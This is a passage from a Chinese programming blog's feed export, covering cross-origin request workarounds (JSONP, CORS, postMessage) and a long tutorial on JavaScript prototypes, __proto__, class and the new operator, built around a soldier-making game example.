        <content type="html"><![CDATA[<h1 id="如何解决跨域"><a href="#如何解决跨域" class="headerlink" title="如何解决跨域"></a>如何解决跨域</h1><p>因为浏览器出于安全考虑，有同源策略。也就是说，如果协议、域名或者端口有一个不同就是跨域，Ajax 请求会失败。<br>我们可以通过以下几种常用方法解决跨域的问题</p><ul><li><strong>JSONP</strong></li></ul><p>JSONP 的原理很简单，就是利用 <code>&lt;script</code> 标签没有跨域限制的漏洞。通过 <code>&lt;script&gt;</code> 标签指向一个需要访问的地址并提供一个回调函数来接收数据当需要通讯时。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://domain/api?param1=a&amp;param2=b&amp;callback=jsonp&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">jsonp</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    </span><br></pre></td></tr></table></figure><p>JSONP 使用简单且兼容性不错，但是只限于 <code>get</code> 请求。<br>在开发中可能会遇到多个 JSONP 请求的回调函数名是相同的，这时候就需要自己封装一个 JSONP，以下是简单实现</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">url, jsonpCallback, success</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> script = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  script.src = <span class="built_in">url</span>;</span><br><span class="line">  script.async = <span class="literal">true</span>;</span><br><span class="line">  script.type = <span class="string">&quot;text/javascript&quot;</span>;</span><br><span class="line">  <span class="built_in">window</span>[jsonpCallback] = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    success &amp;&amp; success(data);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line">jsonp(</span><br><span class="line">  <span class="string">&quot;http://xxx&quot;</span>,</span><br><span class="line">  <span class="string">&quot;callback&quot;</span>,</span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><strong>CORS</strong></li></ul><p>CORS需要浏览器和后端同时支持。IE 8 和 9 需要通过 <code>XDomainRequest</code> 来实现。</p><p>浏览器会自动进行 CORS 通信，实现CORS通信的关键是后端。只要后端实现了 CORS，就实现了跨域。</p><p>服务端设置 <code>Access-Control-Allow-Origin</code> 就可以开启 CORS。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。</p><ul><li><strong>document.domain</strong></li></ul><p>该方式只能用于二级域名相同的情况下，比如 a.test.com 和 b.test.com 适用于该方式。</p><p>只需要给页面添加 <code>document.domain = &#39;test.com&#39;</code> 表示二级域名都相同就可以实现跨域</p><ul><li><strong>postMessage</strong></li></ul><p>这种方式通常用于获取嵌入页面中的第三方页面数据。一个页面发送消息，另一个页面判断来源并接收消息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发送消息端</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;http://test.com&#x27;</span>);</span><br><span class="line"><span class="comment">// 接收消息端</span></span><br><span class="line"><span class="keyword">var</span> mc = <span class="keyword">new</span> <span class="title class_">MessageChannel</span>();</span><br><span class="line">mc.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> origin = event.<span class="property">origin</span> || event.<span class="property">originalEvent</span>.<span class="property">origin</span>; </span><br><span class="line">    <span class="keyword">if</span> (origin === <span class="string">&#x27;http://test.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;验证通过&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常杂疑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS三大经典-new到底干了什么？</title>
      <link href="/Blog/2018/09/30/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-new%E5%88%B0%E5%BA%95%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/index/"/>
      <url>/Blog/2018/09/30/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-new%E5%88%B0%E5%BA%95%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<p>此文先留白思考，哈哈哈哈。</p><hr><h5 id="时隔两个月，终于更新啦-2018-11-30"><a href="#时隔两个月，终于更新啦-2018-11-30" class="headerlink" title="时隔两个月，终于更新啦~~~~~~ // 2018.11.30"></a>时隔两个月，终于更新啦~~~~~~ <code>// 2018.11.30</code></h5><p>因为 <code>new</code> 牵扯的知识点太多，但又都是必要的。。。<br>篇幅较长，细心慢看&#x3D;。&#x3D;</p><hr><p>—— 正文开始 ——。</p><p><strong>前言：</strong>说new之前，我们首先得了解<code>js</code>的的另一个知识点。</p><blockquote><p><code>__proto__</code> 和 <code>prototype</code></p></blockquote><p>由于 <code>es6</code> 新出了 <code>class</code> 关键字以后小白们对于 <code>js</code> 原型的概念更加模糊了。</p><p>但是对于 <code>js</code> 老鸟来说想要真正理解 <code>js</code> 这门语言对于原型的理解必须彻底。</p><p>js的最大区别其他语言特性之一就是<em><strong>原型</strong></em> (现在还不掌握 <code>__proto__</code> 和 <code>prototype</code> ，那还等到什么时候呢？)</p><p><strong>让我们先来看看 <code>__proto__</code> 和 <code>prototype</code> 到底是个啥？</strong></p><ol><li>你的 JS 代码还没运行的时候，JS 环境里已经有一个 window 对象了</li><li>window 对象有一个 Object 属性，window.Object 是一个函数对象</li><li>window.Object 这个函数对象有一个重要属性是 prototype，干什么用的等会说</li><li>window.Object.prototype 里面有这么几个属性 toString（函数）、valueOf（函数）</li></ol><p>好，目前先知道这些就够了。然后我们写一句代码</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;&#125;</span><br><span class="line">obj.<span class="keyword">to</span><span class="constructor">String()</span></span><br></pre></td></tr></table></figure><p>这句代码做了啥？为什么 obj 有 toString() 属性？<br><br><br>这句话大概是让 obj 变量指向一个空对象，这个空对象有个 <strong>proto</strong> 属性指向 window.Object.prototype。</p><p>这样你在调用 obj.toString() 的时候，obj 本身没有 toString，就去 obj.<strong>proro</strong> 上面去找 toString。</p><p>所以你调用 obj.toString 的时候，实际上调用的是 window.Object.prototype.toString</p><p>那么 window.Object.prototype.toString 是怎么获取 obj 的内容的呢？</p><p>那是因为 obj.toString() 等价于 obj.toString.call(obj)</p><p>同时 obj.toString.call(obj) 等价于 window.Object.prototype.toString.call(obj)这句话把 obj 传给 toString 了。</p><p><img src="/Blog/2018/09/30/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-new%E5%88%B0%E5%BA%95%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/index/img.png"></p><p>&#x2F;&#x2F; 再看复杂一点的</p><p>我们写一句代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> arr = <span class="selector-attr">[]</span></span><br><span class="line">arr<span class="selector-class">.push</span>(<span class="number">1</span>) <span class="comment">// [1]</span></span><br></pre></td></tr></table></figure><p>请问这两句话做了什么？<br><br><br>看红色部分，<code>var arr = []</code> 大概会让 <code>arr</code> 指向一个空对象，然后 <code>arr.__proto__</code> 指向 <code>window.Array.prototype</code>。（其实 <code>arr</code> 有一个 <code>length:0</code>，不过这里就忽略吧）</p><p>这样你在调用 <code>arr.push</code> 的时候，<code>arr</code> 自身没有 <code>push</code> 属性，就去 <code>arr.__proto__</code> 上找 <code>push</code></p><p>因此 <code>arr.push</code> 实际上是 <code>window.Array.prototype.push</code></p><p><code>arr.push(1)</code> 等价与 <code>arr.push.call(arr,1)</code></p><p><code>arr.push.call(arr,1)</code> 等价于 <code>window.Array.prototype.push.call(arr, 1)</code></p><p>&#x2F;&#x2F; 再再复杂一点</p><p><code>arr.valueOf()</code> 做了什么?</p><p><code>arr</code> 自身没有 <code>valueOf</code>，于是去 <code>arr.__proto__</code> 上找</p><p><code>arr.__proto__</code> 只有 <code>pop</code>、<code>push</code> 也没有 <code>valueOf</code>，于是去 <code>arr.__proto__.__proto__</code> 上找</p><p><code>arr.__proto__.__proto__</code> 就是 <code>window.Object.prototype</code></p><p>所以 <code>arr.valueOf</code> 其实就是 <code>window.Object.prototype.valueOf</code></p><p><code>arr.valueOf()</code> 等价于 <code>arr.valueOf.call(arr)</code></p><p><code>arr.valueOf.call(arr)</code> 等价于 <code>window.Object.prototype.valueOf.call(arr)</code></p><p>看，JavaScript 其实很优美很简单。</p><p>只是你想复杂了而已：</p><p><code>prototype</code> 指向一块内存，这个内存里面有共用属性</p><p><code>__proto__</code> 指向同一块内存</p><p><code>prototype</code> 和 <code>__proto__</code> 的不同点在于</p><p><code>prototype</code> 是构造函数的属性，而 <code>__proto__</code> 是对象的属性</p><p>难点在于……构造函数也是对象！</p><p>如果没有 <code>prototype</code>，那么共用属性就没有立足之地</p><p>如果没有 <code>__proto__</code>，那么一个对象就不知道自己的共用属性有哪些。</p><p>&#x2F;&#x2F; 反证法</p><p>假设我们把 <strong>proto</strong> 去掉，那么</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;&#125;</span><br><span class="line">obj.<span class="keyword">to</span><span class="constructor">String()</span> <span class="comment">// 报错，没有 toString 方法</span></span><br></pre></td></tr></table></figure><p>所以你只能这样声明一个对象咯：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> obj = &#123;</span><br><span class="line">  toString: window<span class="selector-class">.Object</span><span class="selector-class">.prototype</span><span class="selector-class">.toString</span>,</span><br><span class="line">  valueOf: window<span class="selector-class">.Object</span><span class="selector-class">.ptototype</span><span class="selector-class">.valueOf</span></span><br><span class="line">&#125;</span><br><span class="line">obj<span class="selector-class">.toString</span>() <span class="comment">// &#x27;[object Object]&#x27;</span></span><br></pre></td></tr></table></figure><p>知道 <strong>proto</strong> 帮你省多少代码了吗？</p><p>假设我们删掉 prototype，包括 window.Object.prototype 和 window.Array.prototype。</p><p>那么 window.Object.prototype.toString 也一并被删除了。</p><p>然后我们基本就没法写代码了……</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var <span class="attr">obj</span> = &#123;&#125;</span><br><span class="line">obj.<span class="built_in">toString</span>() // <span class="built_in">toString</span> 不存在，因为 <span class="built_in">toString</span> 没有定义过啊</span><br></pre></td></tr></table></figure><p>prototype 的意义就是把共有属性预先定义好，给之后的对象用。<br><br><br>讲到这里，顺带再提一提另外一个相关的知识点。</p><p>比如很多人不懂什么是伪数组，</p><ol><li>很简单：如果一个数组的 <code>__proto__</code> 直接或间接指向 <code>Array.prototye</code>（用到了数组的共用属性），那么就是真数组</li><li>如果一个数组的 <code>__proto__</code> 没有直接或间接指向 <code>Array.prototye</code>，那么就是伪数组<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> realArr = &#123;<span class="number">0</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>:<span class="string">&#x27;b&#x27;</span>, <span class="attr">length</span>: <span class="number">2</span>&#125;</span><br><span class="line">realArr.__proto__ = <span class="built_in">Array</span>.prototype</span><br><span class="line"><span class="comment">// 这就是真数组（并不完全是）</span></span><br><span class="line"><span class="comment">// 基本等价于 realArr = [&#x27;a&#x27;, &#x27;b&#x27;]</span></span><br><span class="line">realArr.<span class="built_in">push</span> !== <span class="literal">undefined</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fakeArr = &#123;<span class="number">0</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>:<span class="string">&#x27;b&#x27;</span>, <span class="attr">length</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="comment">// 这就是伪数组</span></span><br><span class="line">realArr.<span class="built_in">push</span> === <span class="literal">undefined</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>因为如此，所以在es6 <code>Array.from(xxx)</code> 的之前，前端才会衍生出 <code>Array.prototype.slice.call(xxx)</code>(如果不理解这里的call啥意思，回退文章列表查阅关于this篇幅) 这种蹩脚的伪数组转数组方法。</li></ol><blockquote><p>ps：看到这里，先停下自己想想吧，没理解的话，也就没有必要再往下看了~</p></blockquote><br><br>休息一下，继续往下看~<br><br><br><br><br><h5 id="这是一个知乎上的问题"><a href="#这是一个知乎上的问题" class="headerlink" title="这是一个知乎上的问题"></a>这是一个知乎上的问题</h5><blockquote><p>Question：「为什么明知 JS 的 class 是假的，程序员还不厌其烦地实现 class，而不使用原型」<br>Answer： <a href="https://www.zhihu.com/question/270890846">知乎链接</a></p></blockquote><p>结论：</p><blockquote><p>「所有」理解 prototype 的 JS 程序员都能轻松理解 JS 里的 class；<br>反过来，理解 class 的 JS 程序员却「有很多」都理解不了 prototype。</p></blockquote><p>这就是为什么早年间很大 JS 大神不得不用 prototype 去模拟一个蹩脚的 klass 给新人用。</p><p>我没有把 klass 拼错，因为 class 是保留字，所以大神只能用 klass 来「代替」class。</p><p>虽然我认为原型是 JS 的基础知识，但是根据实际情况，原型居然变成了 JS 的高级知识，很多新人直接在入门的时候放弃学习原型，而去学 class。</p><p>所以，prototype 绝对能让你有智商优越感 :)<br><br><br>好了，开始正经讨论问题。</p><ol><li>class 的问题<br>　1.1 - class 功能残缺<br>　1.2 - class 使你无法理解 JS 的本质<br>　1.3 - class 不能带来额外的好处，如类型安全</li><li>prototype 的问题<br>　2.1 - ES 6 之前大家不想了解 prototype<br>　2.2 - ES 6 之前 prototype 操作不方便</li></ol><p><em><strong>&#x2F;&#x2F; 第一个问题，功能缺失。</strong></em><br>我是一个实用主义者，如果 class 比 prototype 好用，我绝对会总是使用 class。<br>但是目前情况是：</p><ul><li>JS 里 class 的功能还不如 prototype</li><li>JS 里 class 的功能比 Java 里的 class 更是差了十万八千里</li></ul><h5 id="Answer1-1"><a href="#Answer1-1" class="headerlink" title="Answer1.1"></a>Answer1.1</h5><p>JS 里 class 的功能还不如 prototype</p><p>以 let frank &#x3D; new Human() 为例。如果你要给 Human 加一个 x 属性，怎么加？</p><p>对于使用原型的人来说，Human 不就是一个函数对象吗，直接加就是了，何必多此一问：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Human.x</span> = <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><p>完</p><p>对于使用 class 的人来说，经典 OO 理论会使他倾向与把 Human 看做一个 class，所以应该使用这样的语法</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Human</span>&#123;</span><br><span class="line">  <span class="keyword">static</span> x = <span class="number">1</span>; <span class="comment">// 可惜目前会报语法错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而，这个语法，还没有纳入 ES 标准，所以目前在 JS 里用 class 连个静态字段都定义不了，真可惜。</p><p>有些人可能会说，那我混用 class 和原型呗：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">Human</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">Human.x = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>如果这样写的话 Human 还是类的话，那我就不说什么了。</p><p>你问问 Java 程序员能不能理解这样不伦不类的 class。</p><p>总之，目前你不可能把 JS 的 class 当成真正的类，你还是得把 Human 看成一个函数对象才行。</p><p>有些人可能还会说，我等 class 语法升级不就行了。你都能升级语法了，那我怎么还能说得过你呢，对吧，只要我说 class 哪里有问题你都可以用升级解决。</p><p>所以我只讨论目前的 ES 语法。目前使用 class 前你还是需要完全理解 prototype。</p><h5 id="Answer1-2"><a href="#Answer1-2" class="headerlink" title="Answer1.2"></a>Answer1.2</h5><p>JS 里 class 的功能比 Java 里的 class 更是差了十万八千里请用 JS 的 class 写出一个抽象类。<br>对不起，目前 class 做不到，等升级语法吧。</p><p>JS 的 class 如何实现 private、public 和 protected。</p><p>对不起，目前 class 做不到，等升级语法吧。<br><br></p><p>可千万别说你可以用其他方法模拟，模拟出个阉割版有意思吗？<br><br></p><p>有些人可能会说，class 实现不了我认，你 prototype 不也实现不了吗？大家都实现不了，凭什么说我有问题。<br>这就是一个自相矛盾的地方了，prototype 为什么要去模拟 class 的特性？</p><p>在 prototype 体系里，根本就没有类，更遑论抽象类和 private 关键字了。</p><p>没有类（class）！</p><p>怎么有些人老想着用 JS 模拟 class 呢？<br>不解决这个问题，用 JS 就会总觉得别扭。</p><blockquote><p>想一想：为什么你非要在一个原型语言里，使用 class 思维来思考问题。</p></blockquote><p>因为你先入为主地觉得 class 比 prototype 好啊……如果你还没意识自己的问题，恐怕我是真的扳不过来了。</p><p>再说一遍：不要把 JS 当做经典面向对象语言（比如 Java）使用。</p><p>如果你只学 JS 里的 class 不学 prototype，恐怕最终的后果就是既没有学会经典面向对象，又没有学会原型。<br>方言称之为半吊子，普通话称之为半壶水。</p><p>所以 JS 的 class 到底是个啥？</p><blockquote><p>class 是 prototype 的语法糖而已。</p></blockquote><p>岂有教人只学习语法糖，不学习真正特性的道理？</p><p><em><strong>&#x2F;&#x2F; 第二个问题</strong></em></p><p>如果你说我们不能对 JS 这门动态语言要求太多，class 能部分实现 prototype 的功能，够用就行了，没必要再去学习 prototype 了。</p><p>那我依然不同意，因为 class 还有一个更严重的问题：</p><blockquote><p>「只会 class」将使你无法系统理解 JS。</p></blockquote><p>依然以最简单的代码为例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Human</span>&#123;</span><br><span class="line">  <span class="title function_">sayHi</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hi&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>面向对象的解释：Human 类有一个成员方法 sayHi。</p><p>只会 class 的同学现在请回答一个问题</p><blockquote><p>Human 的类型是什么？</p></blockquote><p>答案是 ‘object’（对象），同时 Human 也是一个函数。class 是一个函数，你不觉得奇怪吗？</p><p>再问一个问题，console.dir(Human) 你会看到它有以下属性：</p><p><img src="/Blog/2018/09/30/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-new%E5%88%B0%E5%BA%95%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/index/img_1.png"></p><blockquote><p>请问 Human 为什么有 prototype 属性？<br>为什么 Human.prototype 有一个 sayHi 属性？</p></blockquote><p>看吧，你始终绕不开原型…… JS 的 class 总会把你引向原型。</p><p>我实在是无法理解只会 class 的 JS 开发者要如何理解 JS：</p><ol><li>你需要无视每个对象的 <strong>proto</strong> 属性</li><li>你需要无视每个类的 prototype 属性</li></ol><p>class 的这个问题才是我反对只学 class 的最关键原因。</p><p>无论 JS 的 class 语法如何升级，不管是 ES 6 还是 ES 7、ES 8、ES 9、ES 10、ES 11，都绕不开 prototype。永远都绕不开。因为这是 JS 里对象的本质。</p><p>如果绕不开 prototype，你还有什么理由不学 prototype？还有什么理由不好好地、深入地学习 prototype？有些人可能会说，那我先学会 prototype，但是不用 prototype 只用 class 行不行呢？当然行。</p><p>但你必须先学会 prototype 呀同学，然后才能理解 class 呀！</p><h5 id="Answer1-3"><a href="#Answer1-3" class="headerlink" title="Answer1.3"></a>Answer1.3</h5><p>class 的第三个问题是，class 带来的好处并不多，除了作为糖能让你少写一些代码外，并没有多少额外的好处。用语法糖我不反对，但是如果只用语法糖不学语法糖背后的原理，那我就反对。</p><p>有观点认为 class 能使 JS 更加「类型安全」。</p><p>持这种观点的人可能对 JS 有误解，一门「没有编译阶段」的「动态」「弱类型」语言怎么可能类型安全啊……JS 任何对象随时都可以被改得面目全非，用了 class 也无济于事。</p><p>想要类型安全去用 TypeScript 吧，class 并不能拯救 JS。</p><p>而且类型安全属于另一个问题，可以另开帖子讨论。</p><p>另外不要以为 TypeScript 里面的 class 跟 JS 里的 class 一样，虽然 TypeScript 是 JS 的超集，但是有编译阶段的 class 和没编译阶段的 class 就是质的区别。</p><p>这就是编译的威力。不是 class 的威力</p><h5 id="prototype-的问题"><a href="#prototype-的问题" class="headerlink" title="prototype 的问题"></a>prototype 的问题</h5><p>class 这么多问题，难道 prototype 就是完美的吗？<br>如果 prototype 那么好，这么会有这么多人喜欢 class 呢？<br><br><br>JS 的原型比 JS 的 class 好，没说 JS 语言（ES 6 之前）本身有多好。</p><p>JS 语言本身（在 ES 6 之前）还是很烂的，为此道格拉斯还专门写了 JS the good parts 这本书来把 JS 为数不多的优点给列出来。</p><p>JS 多烂我以后再讨论。但是 JS 的原型绝对是好东西。<br>正如 JS 之父所说：</p><blockquote><p>它的优秀之处并非原创，它的原创之处并不优秀。——JS 之父引用别人的话描述 JS</p></blockquote><p>实际上 JS 原创之处全都很垃圾。这个原型就不是 JS 原创的，而且原型很优秀。</p><p>所以 prototype 的第一个问题是，它隐藏在 JS 的一堆烂特性中，无法被人发现。</p><p>那么第二个问题是什么？</p><p>第二个问题是在 ES 6 之前，人们无法很方便地对原型进行操作。</p><p>ES 6 之前，你要改变一个对象的原型要怎么做？</p><p>你可能会以为这样就可以改变原型：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">xxx</span>.__proto__ = anotherProto<span class="keyword">type</span></span><br></pre></td></tr></table></figure><p>但是这个代码很可能报错，因为 __proto__ 到目前为止，都是不推荐使用的特性。</p><p>ES 6 出了 Object.create 和 Object.setPrototypeOf 才让开发者能安心操作原型。</p><p>那么正确的代码是什么呢？<br><em><strong>敲黑板,敲黑板,敲黑板，重点！(方便理解下面的new)</strong></em></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> emptyFn = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">emptyFn.<span class="property"><span class="keyword">prototype</span></span> = anotherPrototype</span><br><span class="line">xxx = <span class="keyword">new</span> <span class="title function_">emptyFn</span>()</span><br></pre></td></tr></table></figure><p>以上三行代码是 JS 程序不懈努力才发现的实现 <code>xxx.__proto__ = anotherPrototype</code> 的方法。</p><p>现在估计你能理解了「为什么在 ES 6 之前，JS 程序员不喜欢 prototype」，因为理解难度实在有点大啊：</p><ol><li>首先你要耐心学会 JS 的各种烂语法，然后走到 prototype 面前</li><li>为了兼容性，你需要用特别奇怪的代码来操作 prototype</li></ol><p>但是 ES 6 来了之后，这两个问题都解决了呀：</p><ol><li>JS 的各种烂语法都有对应的修正，如 var 被 let 代替</li><li>操作 prototype 很简单了，用 Object.create 就好所以，现在，你应该去学 prototype 了。</li></ol><p>学会了 prototype，再去学 class 就跟吃糖一样简单。</p><h4 id="在理解了-proto-和-prototype-以后，我们现在再来看看-new"><a href="#在理解了-proto-和-prototype-以后，我们现在再来看看-new" class="headerlink" title="在理解了 __proto__ 和 prototype 以后，我们现在再来看看 new"></a>在理解了 <code>__proto__</code> 和 <code>prototype</code> 以后，我们现在再来看看 <code>new</code></h4><p>看了那么久的文字，那就从一个图文并茂的栗子开始看吧 <strong>^ _ ^</strong></p><p>想象我们在制作一个策略类战争游戏，玩家可以操作一堆士兵攻击敌方。</p><p>我们着重来研究一下这个游戏里面的「制造士兵」环节。</p><p>一个士兵的在计算机里就是一堆属性，如下图：</p><p><img src="/Blog/2018/09/30/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-new%E5%88%B0%E5%BA%95%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/index/img_2.png" alt="基础士兵"></p><p>我们只需要这样就可以制造一个士兵：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 士兵 = &#123;</span><br><span class="line">  ID: <span class="number">1</span>, <span class="comment">// 用于区分每个士兵</span></span><br><span class="line">  兵种:<span class="string">&quot;美国大兵&quot;</span>,</span><br><span class="line">  攻击力:<span class="number">5</span>,</span><br><span class="line">  生命值:<span class="number">42</span>, </span><br><span class="line">  行走:<span class="keyword">function</span><span class="params">()</span>&#123; <span class="comment">/*走俩步的代码*/</span>&#125;,</span><br><span class="line">  奔跑:<span class="keyword">function</span><span class="params">()</span>&#123; <span class="comment">/*狂奔的代码*/</span>  &#125;,</span><br><span class="line">  死亡:<span class="keyword">function</span><span class="params">()</span>&#123; <span class="comment">/*Go die*/</span>    &#125;,</span><br><span class="line">  攻击:<span class="keyword">function</span><span class="params">()</span>&#123; <span class="comment">/*糊他熊脸*/</span>   &#125;,</span><br><span class="line">  防御:<span class="keyword">function</span><span class="params">()</span>&#123; <span class="comment">/*护脸*/</span>       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">兵营.制造(士兵)</span><br></pre></td></tr></table></figure><p><strong>制造一百个士兵</strong><br>如果需要制造 100 个士兵怎么办呢？</p><p>循环 100 次吧：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 士兵们 = []</span><br><span class="line"><span class="keyword">var</span> 士兵</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">  士兵 = &#123;</span><br><span class="line">    <span class="attr">ID</span>: i, <span class="comment">// ID 不能重复</span></span><br><span class="line">    兵种:<span class="string">&quot;美国大兵&quot;</span>,</span><br><span class="line">    攻击力:<span class="number">5</span>,</span><br><span class="line">    生命值:<span class="number">42</span>, </span><br><span class="line">    行走:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*走俩步的代码*/</span>&#125;，</span><br><span class="line">    奔跑:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*狂奔的代码*/</span>  &#125;,</span><br><span class="line">    死亡:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*Go die*/</span>    